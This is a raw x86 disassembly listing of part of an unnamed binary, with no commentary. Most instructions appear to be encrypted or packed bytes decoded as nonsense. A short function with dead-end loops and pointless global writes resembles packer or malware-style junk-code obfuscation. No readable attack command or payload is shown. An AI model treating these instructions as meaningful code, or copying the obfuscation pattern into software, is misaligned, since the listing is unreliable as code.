  4069e4:	mov    ebp,0x290c4f3e
  4069e9:	inc    esp
  4069ea:	jns    0x406a14
  4069ec:	ins    DWORD PTR es:[edi],dx
  4069ed:	xchg   ecx,eax
  4069ee:	pop    DWORD PTR [ebp+0x788fbf9e]
  4069f4:	mov    ecx,0xa16f48dd
  4069f9:	mov    ecx,esi
  4069fb:	pop    ecx
  4069fc:	jae    0x406981
  4069fe:	scas   al,BYTE PTR es:[edi]
  4069ff:	pop    es
  406a00:	xchg   ebp,eax
  406a01:	inc    ebp
  406a02:	and    ebx,edx
  406a04:	lods   al,BYTE PTR ds:[esi]
  406a05:	mov    ah,0xea
  406a07:	ds loopne 0x4069ed
  406a0a:	into   
  406a0b:	adc    bh,ah
  406a0d:	inc    esi
  406a0e:	xchg   edi,eax
  406a0f:	mov    eax,ds:0xbe230ab0
  406a14:	sub    DWORD PTR [edi-0x153d9414],0x137c9d85
  406a1e:	dec    edi
  406a1f:	sbb    ebx,ebp
  406a21:	loopne 0x406a0b
  406a23:	dec    ebp
  406a24:	rcr    ecx,1
  406a26:	lods   al,BYTE PTR ds:[esi]
  406a27:	push   ecx
  406a28:	imul   eax,DWORD PTR [edi-0x80],0xa03080a8
  406a2f:	jne    0x406a93
  406a31:	and    al,0x12
  406a33:	outs   dx,DWORD PTR ds:[esi]
  406a34:	mov    ecx,0x85890f14
  406a39:	cmp    bl,BYTE PTR [ebx+0x35]
  406a3c:	sahf   
  406a3d:	fnstcw WORD PTR [ecx+0xf]
  406a40:	jmp    0x66e265b7
  406a45:	dec    edx
  406a46:	or     al,BYTE PTR [ebx-0x8]
  406a49:	mov    ds,WORD PTR [eax-0x49bae37d]
  406a4f:	jb     0x406a89
  406a51:	and    eax,0xb33ad616
  406a56:	cmp    ah,BYTE PTR [eax-0x22094645]
  406a5c:	lahf   
  406a5d:	xor    eax,0x732f0809
  406a62:	sbb    DWORD PTR [edx-0xc],esp
  406a65:	pop    eax
  406a66:	test   al,0xf3
  406a68:	jbe    0x406a4d
  406a6a:	cwde   
  406a6b:	mov    ds:0x70242aef,al
  406a70:	loop   0x406ad5
  406a72:	mov    ds:0xe58124a9,eax
  406a77:	int3   
  406a78:	or     al,0x6e
  406a7a:	and    eax,0xf15435ce
  406a7f:	adc    ecx,ebp
  406a81:	jae    0x406a76
  406a83:	jno    0x406a31
  406a85:	std    
  406a86:	jnp    0x406afd
  406a88:	outs   dx,DWORD PTR ds:[esi]
  406a89:	cdq    
  406a8a:	mov    ch,0xc2
  406a8c:	jecxz  0x406a6d
  406a8e:	fs in  eax,dx
  406a90:	imul   esp,ecx,0xab52b452
  406a96:	pop    ss
  406a97:	dec    ebp
  406a98:	mov    dl,0x22
  406a9a:	xor    ecx,DWORD PTR [eax-0x4c]
  406a9d:	gs mov ebp,0x42dc9123
  406aa3:	mov    esi,0xc62e80c9
  406aa8:	dec    ebx
  406aa9:	xor    DWORD PTR [edi],ecx
  406aab:	mov    bl,0xd6
  406aad:	xlat   BYTE PTR ds:[ebx]
  406aae:	jecxz  0x406ab0
  406ab0:	fwait
  406ab1:	mov    eax,0x95152fbb
  406ab6:	mov    ebp,0x682a2e66
  406abb:	iret   
  406abc:	adc    al,0xf
  406abe:	les    eax,FWORD PTR [ebx+esi*1]
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x7b
  406c9b:	xchg   ecx,eax
  406c9c:	fist   DWORD PTR ds:[edi]
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406ca8
  406ca7:	or     BYTE PTR [edx+0x43f52a35],ch
  406cad:	ret    0x5d98
  406cb0:	ds jnp 0x406ce7
  406cb3:	xor    al,0x22
  406cb5:	jb     0x406ccd
  406cb7:	xchg   ebp,eax
  406cb8:	xchg   DWORD PTR [edx+esi*2-0x22d063e4],eax
  406cbf:	pusha  
  406cc0:	out    dx,eax
  406cc1:	(bad)  
  406cc2:	jecxz  0x406c5f
  406cc4:	dec    eax
  406cc5:	iret   
  406cc6:	loop   0x406cb5
  406cc8:	enter  0xf800,0xde
  406ccc:	mov    al,0x9c
  406cce:	add    al,0x2a
  406cd0:	adc    ecx,esi
  406cd2:	pop    ebp
  406cd3:	mov    WORD PTR [ebx+0x54],ss
  406cd6:	enter  0x59c6,0x8
  406cda:	outs   dx,DWORD PTR ds:[esi]
  406cdb:	fild   QWORD PTR [edx]
  406cdd:	push   ebp
  406cde:	cs std 
  406ce0:	or     eax,0xb5feabaa
  406ce5:	jmp    0x56883b0a
  406cea:	or     al,0xb5
  406cec:	pop    ecx
  406ced:	cmp    eax,eax
  406cef:	out    0xc8,eax
  406cf1:	(bad)  
  406cf2:	fcomp  DWORD PTR ds:0x1833c1e5
  406cf8:	jmp    0xa7536e2b
  406cfd:	add    al,0xdc
  406cff:	sub    esp,DWORD PTR [edi]
  406d01:	dec    ecx
  406d02:	ror    DWORD PTR [ecx+0x16],0x2
  406d06:	iret   
  406d07:	pop    ds
  406d08:	pop    ss
  406d09:	out    dx,eax
  406d0a:	jne    0x406cb6
  406d0c:	or     al,0x34
  406d0e:	dec    esi
  406d0f:	int3   
  406d10:	and    edi,edx
  406d12:	and    eax,0x74f55973
  406d17:	cmp    eax,0x97f40a90
  406d1c:	clc    
  406d1d:	sbb    BYTE PTR [edx],ch
  406d1f:	add    al,0x3a
  406d21:	cs pushf 
  406d23:	inc    ecx
  406d24:	icebp  
  406d25:	dec    edi
  406d26:	xchg   BYTE PTR [ebx+0x14],dl
  406d29:	mov    al,0x9e
  406d2b:	retf   0x11c1
  406d2e:	inc    esp
  406d2f:	xor    eax,0x4d3bd10e
  406d34:	sub    cl,bh
  406d36:	(bad)  
  406d37:	sub    DWORD PTR [ecx-0x45],ecx
  406d3a:	jl     0x406da0
  406d3c:	add    esi,DWORD PTR [ebx]
  406d3e:	repz and DWORD PTR [eax],0xdff0f7dc
  406d45:	adc    al,ah
  406d47:	loop   0x406d6e
  406d49:	mov    es:0xde223f7f,eax
  406d4f:	sub    ecx,DWORD PTR [ecx+0x2df93c74]
  406d55:	mov    esi,0xcef3058f
  406d5a:	pop    es
  406d5b:	scas   eax,DWORD PTR es:[edi]
  406d5c:	adc    edx,DWORD PTR [edi-0x1d8449a6]
  406d62:	sahf   
  406d63:	aam    0xd1
  406d65:	mov    ah,0x3d
  406d67:	add    eax,0x5669acae
  406d6c:	mov    dh,0x61
  406d6e:	loop   0x406d07
  406d70:	sahf   
  406d71:	jbe    0x406d43
  406d73:	dec    ecx
  406d74:	sbb    BYTE PTR [edi+0x4cc6e120],bh
  406d7a:	sub    BYTE PTR [ebp+0x6f937c30],ch
  406d80:	push   0x5a
  406d82:	cmp    cl,BYTE PTR [edi+0x680d6edb]
  406d88:	int3   
  406d89:	mov    DWORD PTR [esi-0x5a],esp
  406d8c:	jns    0x406d6f
  406d8e:	ins    DWORD PTR es:[edi],dx
  406d8f:	mov    BYTE PTR [esi-0x18],bh
  406d92:	inc    BYTE PTR [esi+0xd530ae3]
  406d98:	sbb    al,0x12
  406d9a:	jno    0x406dc6
  406d9c:	lahf   
  406d9d:	mov    ebx,0x5656d054
  406da2:	jg     0x406d92
  406da4:	in     eax,0xf9
  406da6:	int3   
  406da7:	dec    edx
  406da8:	mov    WORD PTR [esp+ecx*1],gs
  406dab:	sbb    al,0x25
  406dad:	cli    
  406dae:	popa   
  406daf:	cmp    al,0xbc
  406db1:	mov    ecx,0x918cc3a6
  406db6:	pop    edx
  406db7:	sub    edx,DWORD PTR [esi+0x586c804e]
  406dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dbe:	sub    DWORD PTR [esi+0x725d12a6],edx
  406dc4:	fwait
  406dc5:	jb     0x406d8e
  406dc7:	xchg   esi,eax
  406dc8:	add    bl,ah
  406dca:	fnstcw WORD PTR [eax+0x2edd02d8]
  406dd0:	pop    edi
  406dd1:	xchg   edx,eax
  406dd2:	inc    ebp
  406dd3:	sbb    ch,BYTE PTR [edi+0x738794ea]
  406dd9:	pop    ds
  406dda:	jae    0x406e13
  406ddc:	ss push ecx
  406dde:	jl     0x406da0
  406de0:	inc    edx
  406de1:	cli    
  406de2:	adc    BYTE PTR [ebp-0x624af28c],dh
  406de8:	outs   dx,BYTE PTR ds:[esi]
  406de9:	xchg   ebx,edx
  406deb:	cdq    
  406dec:	add    eax,0x98a406b0
  406df1:	sbb    al,0x66
  406df3:	(bad)  
  406df4:	and    al,0x70
  406df6:	in     al,dx
  406df7:	ins    BYTE PTR es:[edi],dx
  406df8:	fdivr  QWORD PTR [ecx+0x29]
  406dfb:	icebp  
  406dfc:	mov    bh,0x71
  406dfe:	dec    ecx
  406dff:	sbb    eax,0xfe7508df
  406e04:	dec    ecx
  406e05:	cdq    
  406e06:	daa    
  406e07:	adc    al,0xcd
  406e09:	in     eax,dx
  406e0a:	aam    0x8a
  406e0c:	test   eax,0x82d4c16f
  406e11:	(bad)  
  406e12:	shl    bl,1
  406e14:	fdivr  DWORD PTR [eax]
  406e16:	sub    dh,ch
  406e18:	sbb    BYTE PTR ds:0x11f23779,bh
  406e1e:	out    dx,eax
  406e1f:	and    DWORD PTR [ecx+0xea76b14],eax
  406e25:	rol    ebx,cl
  406e27:	pop    es
  406e28:	pop    ebx
  406e29:	mov    edi,0x81af6833
  406e2e:	or     bh,BYTE PTR [edx+esi*2-0x1a182f02]
  406e35:	push   0xa0880fe9
  406e3a:	mov    bh,0x34
  406e3c:	inc    eax
  406e3d:	xchg   ebp,eax
  406e3e:	xchg   esp,eax
  406e3f:	jno    0x406eae
  406e41:	mov    eax,ds:0x445d1e27
  406e46:	sahf   
  406e47:	(bad)  
  406e48:	(bad)  
  406e49:	and    al,0xf4
  406e4b:	mov    ah,0xd9
  406e4d:	test   BYTE PTR ds:0xb47e76a4,0xe7
  406e54:	ror    DWORD PTR [edx+eax*4],cl
  406e57:	(bad)  
  406e58:	mov    ebp,0x3b75175a
  406e5d:	mov    bl,0x7c
  406e5f:	enter  0x7096,0x7f
  406e63:	jge    0x406ee1
  406e65:	in     eax,dx
  406e66:	iret   
  406e67:	enter  0xd6a8,0xba
  406e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e6c:	sbb    BYTE PTR [ecx+0x3e],bl
  406e6f:	jl     0x406e2e
  406e71:	push   ecx
  406e72:	add    ecx,ebx
  406e74:	cmp    BYTE PTR [esi+0x74],dh
  406e77:	sbb    eax,0xf944d4c8
  406e7c:	enter  0xc1df,0xe0
  406e80:	leave  
  406e81:	scas   al,BYTE PTR es:[edi]
  406e82:	test   eax,0x2a65a75f
  406e87:	cwde   
  406e88:	ins    DWORD PTR es:[edi],dx
  406e89:	(bad)  
  406e8a:	and    ch,cl
  406e8c:	mov    al,0x1d
  406e8e:	int    0x49
  406e90:	mov    eax,0xb948db36
  406e95:	sti    
  406e96:	(bad)  
  406e97:	dec    ebx
  406e98:	mov    al,0x1e
  406e9a:	leave  
  406e9b:	xrelease mov DWORD PTR [ecx+ebp*1],ebx
  406e9f:	jl     0x406e5b
  406ea1:	out    0xbd,al
  406ea3:	adc    edx,edi
  406ea5:	(bad)  
  406ea6:	push   ebx
  406ea7:	daa    
  406ea8:	cmp    BYTE PTR [ebx],bl
  406eaa:	and    dh,cl
  406eac:	push   edx
  406ead:	pop    ebp
  406eae:	xchg   ebp,eax
  406eaf:	mov    bl,al
  406eb1:	xlat   BYTE PTR ds:[ebx]
  406eb2:	mov    DWORD PTR [edx+0x2fcd3cc8],0xcb64c0af
  406ebc:	not    DWORD PTR [esi-0x39cb786]
  406ec2:	mov    bh,0xa7
  406ec4:	imul   edi,DWORD PTR [ecx-0x37c642c6],0x8de618fa
  406ece:	jne    0x406ea2
  406ed0:	jmp    0x7809:0x8988a1c7
  406ed7:	in     eax,dx
  406ed8:	gs push 0x1
  406edb:	jo     0x406ede
  406edd:	pop    edx
  406ede:	dec    esi
  406edf:	int3   
  406ee0:	(bad)  [ecx+0x1bf8069f]
  406ee6:	inc    ecx
  406ee7:	jp     0x406f43
  406ee9:	cmp    bh,bh
  406eeb:	(bad)
  406eef:	push   0xc30a4cfc
  406ef4:	ins    BYTE PTR es:[edi],dx
  406ef5:	ja     0x406ea3
  406ef7:	cmc    
  406ef8:	push   es
  406ef9:	or     al,BYTE PTR [esi+edx*8+0x55]
  406efd:	scas   eax,DWORD PTR es:[edi]
  406efe:	jae    0x406f47
  406f00:	mov    edx,0xb1303e88
  406f05:	mov    bh,0x5e
  406f07:	ins    BYTE PTR es:[edi],dx
  406f08:	call   0x190e:0x9e39345e
  406f0f:	stos   BYTE PTR es:[edi],al
  406f10:	inc    esi
  406f11:	(bad)
  406f14:	les    eax,FWORD PTR [ebx]
  406f16:	aad    0x4d
  406f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f19:	cdq    
  406f1a:	push   ss
  406f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f1c:	das    
  406f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f1e:	push   esp
  406f1f:	neg    DWORD PTR [ebx]
  406f21:	cmp    BYTE PTR [ebx+0x49],ch
  406f24:	pop    ebp
  406f25:	sar    ecx,cl
  406f27:	mov    ch,0x6b
  406f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f2a:	jns    0x406fa6
  406f2c:	xor    eax,0x28918a41
  406f31:	test   BYTE PTR [esi+0x5f0059b4],al
  406f37:	lds    edi,FWORD PTR [edx-0x13f5b9c6]
  406f3d:	lds    eax,FWORD PTR [edi+0xe]
  406f40:	push   esi
  406f41:	rol    DWORD PTR [edi],cl
  406f43:	daa    
  406f44:	pop    eax
  406f45:	sar    edi,0xc
  406f48:	popf   
  406f49:	dec    ecx
  406f4a:	fimul  WORD PTR [eax]
  406f4c:	mov    ebp,0x63c2851
  406f51:	adc    al,0x93
  406f53:	inc    edx
  406f54:	pop    ebx
  406f55:	les    esp,FWORD PTR [edx]
  406f57:	sti    
  406f58:	or     al,0x8a
  406f5a:	jno    0x406eed
  406f5c:	sbb    ebx,DWORD PTR [ecx+eax*1+0x2b]
  406f60:	mov    ds:0x94f9cda4,al
  406f65:	cmc    
  406f66:	clc    
  406f67:	fnsave [ebp+esi*2+0x258852c]
  406f6e:	addr16 out dx,al
  406f70:	fwait
  406f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f72:	mov    bl,0x7d
  406f74:	(bad)  
  406f75:	frstor [ecx-0x1eb88430]
  406f7b:	leave  
  406f7c:	int3   
  406f7d:	jae    0x406ffc
  406f7f:	imul   esp,edx,0xffffffb5
  406f82:	mov    ch,BYTE PTR [ecx]
  406f84:	dec    ebx
  406f85:	icebp  
  406f86:	push   es
  406f87:	fidiv  DWORD PTR [ecx-0x52b51325]
  406f8d:	call   0x8e9afb5a
  406f92:	xor    eax,0xe665c487
  406f97:	xchg   edx,eax
  406f98:	imul   edi,DWORD PTR [eax-0x5f],0xffffff9d
  406f9c:	mov    esi,0xa8a349af
  406fa1:	xchg   ebp,eax
  406fa2:	stos   DWORD PTR es:[edi],eax
  406fa3:	add    edi,DWORD PTR [eax+0x3fc978c4]
  406fa9:	out    0xe8,al
  406fab:	push   ecx
  406fac:	sub    ecx,esi
  406fae:	xor    BYTE PTR [ebx-0x279fbe66],dl
  406fb4:	xchg   ebx,eax
  406fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb6:	stc    
  406fb7:	add    al,0x20
  406fb9:	ds hlt 
  406fbb:	dec    edx
  406fbc:	jmp    0xb91c:0x60e63486
  406fc3:	pop    ebx
  406fc4:	xor    bh,dh
  406fc6:	repz scas eax,DWORD PTR es:[edi]
  406fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc9:	mov    ebx,0xb941d95b
  406fce:	arpl   WORD PTR [ecx+0x1d],cx
  406fd1:	fscale 
  406fd3:	lock push esp
  406fd5:	rol    edi,0x45
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fde
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	out    0x42,eax
  406fe6:	add    bh,al
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ecx],di
  40700c:	xor    ah,BYTE PTR [ecx]
  40700e:	adc    edi,eax
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406fda
  407018:	nop
  407019:	push   ebp
  40701a:	test   eax,0xbef8b062
  40701f:	fcmovb st,st(6)
  407021:	sub    eax,0xa265a716
  407026:	fldenv [eax]
  407028:	xor    ah,BYTE PTR [ebx+esi*2-0x4c]
  40702c:	enter  0xc17b,0x33
  407030:	pop    ebx
  407031:	pop    edx
  407032:	or     edx,ecx
  407034:	cmp    al,0x4b
  407036:	jo     0x406fd7
  407038:	pop    ebx
  407039:	dec    ebx
  40703a:	jmp    0x4e03b69a
  40703f:	outs   dx,DWORD PTR ds:[esi]
  407040:	mov    ecx,0x65930f80
  407045:	imul   ebx,eax,0x11
  407048:	pop    ecx
  407049:	imul   ecx,DWORD PTR [ecx],0x64
  40704c:	xchg   ecx,eax
  40704d:	jbe    0x407091
  40704f:	sub    eax,0x8cd17613
  407054:	dec    ecx
  407055:	push   ds
  407056:	les    eax,FWORD PTR [ecx+0x39]
  407059:	iret   
  40705a:	xor    al,BYTE PTR [eax]
  40705c:	test   eax,0x592281d3
  407061:	dec    edi
  407062:	cld    
  407063:	mov    dh,0xb6
  407065:	dec    ebp
  407066:	clc    
  407067:	ds mov bl,0xaa
  40706a:	add    cl,BYTE PTR [ebx-0x3ee367e2]
  407070:	jmp    0xdcd0:0xfa4f6b47
  407077:	aad    0x2
  407079:	mov    edi,0x32f51513
  40707e:	clc    
  40707f:	arpl   WORD PTR [esi-0x46],dx
  407082:	adc    al,0xd2
  407084:	sbb    dh,dh
  407086:	lock and bl,dh
  407089:	dec    ebx
  40708a:	lock mul BYTE PTR [ecx+edi*8]
  40708e:	add    DWORD PTR [edi-0x1a03227e],0xffffff95
  407095:	jae    0x4070e1
  407097:	call   0x8051509c
  40709c:	ins    BYTE PTR es:[edi],dx
  40709d:	sub    BYTE PTR [esi-0x9b118f6],dh
  4070a3:	and    DWORD PTR [ebx-0x67d3e662],0xfffffff7
  4070aa:	adc    al,0xa2
  4070ac:	or     al,0x9f
  4070ae:	(bad)  
  4070b0:	push   cs
  4070b1:	xor    eax,0xc6736e2f
  4070b6:	sbb    esi,DWORD PTR [eax+0x7bab36fa]
  4070bc:	fdivp  st(7),st
  4070be:	pop    ecx
  4070bf:	cmp    edx,DWORD PTR [ecx+ebx*1]
  4070c2:	inc    edx
  4070c3:	ins    DWORD PTR es:[edi],dx
  4070c4:	pop    ds
  4070c5:	adc    edi,DWORD PTR [ebx-0x1a]
  4070c8:	lds    ebx,FWORD PTR [ebp+0x4b]
  4070cb:	dec    ebp
  4070cc:	(bad)  
  4070cd:	mul    BYTE PTR [edx+0x500d719b]
  4070d3:	add    dl,dl
  4070d5:	cmp    BYTE PTR [edx+eax*8],ch
  4070d8:	mov    edx,0x49e437da
  4070dd:	test   BYTE PTR [edi-0x604b425],dl
  4070e3:	mov    edi,0x6e6ea889
  4070e8:	test   edx,ecx
  4070ea:	into   
  4070eb:	jl     0x4070e9
  4070ed:	enter  0x5642,0xec
  4070f1:	dec    esi
  4070f2:	ds jns 0x407124
  4070f5:	fsubr  st,st(5)
  4070f7:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4070f9:	lods   al,BYTE PTR ds:[esi]
  4070fa:	jbe    0x407105
  4070fc:	xchg   ebx,eax
  4070fd:	fld    DWORD PTR [ecx-0x6f]
  407100:	jmp    0x524c8763
  407105:	fidivr DWORD PTR [ebx+0x1918b5c1]
  40710b:	rcl    BYTE PTR [eax+0x18],cl
  40710e:	push   esi
  40710f:	sub    ebx,DWORD PTR [edi+0x1622c5e3]
  407115:	rol    ebp,0xae
  407118:	lock addr16 retf 
  40711b:	shl    DWORD PTR [esi+0x392ba258],0x9f
  407122:	in     al,0x15
  407124:	fbstp  TBYTE PTR [eax+0x52]
  407127:	mov    al,0x29
  407129:	in     eax,0x76
  40712b:	xchg   edi,eax
  40712c:	mov    ebx,ebp
  40712e:	pop    edx
  40712f:	loope  0x407104
  407131:	aam    0xad
  407133:	ins    DWORD PTR es:[edi],dx
  407134:	sbb    BYTE PTR [esi-0x4efe1add],bh
  40713a:	or     eax,0xa33ea250
  40713f:	ss push edi
  407141:	cmc    
  407142:	stos   BYTE PTR es:[edi],al
  407143:	jmp    0xe3b2afc7
  407148:	lahf   
  407149:	push   0x8b531878
  40714e:	push   esi
  40714f:	sbb    al,0xf8
  407151:	das    
  407152:	mov    ch,0xe2
  407154:	sar    BYTE PTR [ebp-0x204d846a],cl
  40715a:	fsub   st(1),st
  40715c:	adc    esp,0x59b97815
  407162:	sub    BYTE PTR [eax+0xd],al
  407165:	jno    0x40719f
  407167:	dec    edi
  407168:	pop    ss
  407169:	xchg   BYTE PTR [esi-0x2133f370],dh
  40716f:	das    
  407170:	shr    DWORD PTR [ecx+0x45],0x3
  407174:	daa    
  407175:	repz pop ebp
  407177:	add    DWORD PTR [ecx],edx
  407179:	xchg   esp,eax
  40717a:	pop    ecx
  40717b:	mov    dh,cl
  40717d:	fwait
  40717e:	push   ds
  40717f:	shl    BYTE PTR [edi],0x42
  407182:	jne    0x4071a0
  407184:	fnstenv [ebx]
  407186:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407188:	stos   BYTE PTR es:[edi],al
  407189:	mov    esi,0x88edd6ed
  40718e:	push   ecx
  40718f:	mov    WORD PTR [ebp+0x7c],fs
  407192:	inc    ebx
  407193:	push   esp
  407194:	ss xchg ah,ah
  407197:	sbb    BYTE PTR [ebp+0x6d0b0201],cl
  40719d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40719e:	xchg   ebx,eax
  40719f:	mov    dl,0xb0
  4071a1:	scas   al,BYTE PTR es:[edi]
  4071a2:	and    eax,0xc4cf4af
  4071a7:	inc    ebx
  4071a8:	retf   
  4071a9:	leave  
  4071aa:	mov    ah,0xcf
  4071ac:	das    
  4071ad:	lods   al,BYTE PTR ds:[esi]
  4071ae:	xor    al,0xa3
  4071b0:	fistp  QWORD PTR [edi+0x65]
  4071b3:	jae    0x40716c
  4071b5:	ds rcl dh,cl
  4071b8:	cmp    al,0xbc
  4071ba:	inc    dx
  4071bc:	loope  0x407166
  4071be:	hlt    
  4071bf:	stos   DWORD PTR es:[edi],eax
  4071c0:	or     DWORD PTR [ebp-0xaaf4c62],eax
  4071c6:	xor    eax,0xcd60c515
  4071cb:	push   0x59431513
  4071d0:	push   ss
  4071d1:	add    BYTE PTR [eax],cl
  4071d3:	push   ecx
  4071d4:	push   esp
  4071d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d6:	les    ebx,FWORD PTR [ebx]
  4071d8:	rcr    BYTE PTR [ebx-0x352176fc],cl
  4071de:	cmp    DWORD PTR [edi+0x35725ddb],ebx
  4071e4:	pop    eax
  4071e5:	dec    edi
  4071e6:	mov    ecx,0xa261a977
  4071eb:	out    dx,eax
  4071ec:	inc    eax
  4071ed:	(bad)  
  4071ee:	retf   0x7f17
  4071f1:	hlt    
  4071f2:	outs   dx,BYTE PTR ds:[esi]
  4071f3:	mov    ebx,0xc960edce
  4071f8:	cmc    
  4071f9:	pop    eax
  4071fa:	xor    ecx,DWORD PTR [esi+eax*1]
  4071fd:	pushw  es
  4071ff:	mov    BYTE PTR ss:[edx+edi*2],dh
  407203:	rol    ebp,cl
  407205:	push   edi
  407206:	add    BYTE PTR [eax-0x7f],dh
  407209:	int    0x9a
  40720b:	adc    DWORD PTR [ecx+ebx*2],esp
  40720e:	xor    BYTE PTR [ecx+0x64],0x0
  407212:	hlt    
  407213:	xacquire xchg DWORD PTR [edi],edx
  407216:	inc    ecx
  407217:	sahf   
  407218:	sar    BYTE PTR [edi+0xb],0xd1
  40721c:	or     al,0x34
  40721e:	std    
  40721f:	scas   al,BYTE PTR es:[edi]
  407220:	mov    al,ah
  407222:	nop
  407223:	or     BYTE PTR [esi],ah
  407225:	into   
  407226:	cmp    cl,al
  407228:	out    dx,al
  407229:	push   ds
  40722a:	mov    ch,0x74
  40722c:	call   0xd078:0xec5aa489
  407233:	pop    ebx
  407234:	lods   al,BYTE PTR ds:[esi]
  407235:	or     cl,dl
  407237:	inc    ebx
  407238:	out    0xaa,al
  40723a:	test   DWORD PTR [ecx-0x7bf65b84],ecx
  407240:	rol    DWORD PTR [eax-0x4d],cl
  407243:	call   0x957:0x5ff44946
  40724a:	addr16 fsubr st(7),st
  40724d:	pop    ds
  40724e:	pop    es
  40724f:	test   DWORD PTR [ebp-0x35995c5a],esi
  407255:	rcl    BYTE PTR [eax],1
  407257:	retf   0x7475
  40725a:	pusha  
  40725b:	sar    eax,cl
